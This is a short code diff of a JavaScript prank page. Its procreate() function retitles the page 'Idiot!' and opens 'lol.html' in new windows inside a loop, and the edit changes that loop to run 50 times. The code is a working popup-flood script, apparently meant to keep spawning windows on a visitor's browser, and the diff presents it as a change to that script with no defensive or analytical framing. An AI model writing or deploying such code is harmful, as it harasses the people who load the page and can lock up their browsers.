@@ -24,19 +24,9 @@ function openWindow(url) {
 
 function procreate() {
 	changeTitle("Idiot!");
-	for (var i = 0; i < 5; i++) {
+	for (var i = 0; i < 50; i++) {
 		openWindow('lol.html');
-		openWindow('lol.html');
-		openWindow('lol.html');
-		openWindow('lol.html');
-		openWindow('lol.html');
-		openWindow('lol.html');
-		openWindow('lol.html');
-		openWindow('lol.html');
-		openWindow('lol.html');
-		openWindow('lol.html');
-		openWindow('lol.html');
-		openWindow('lol.html');
+
 	}
 }
 
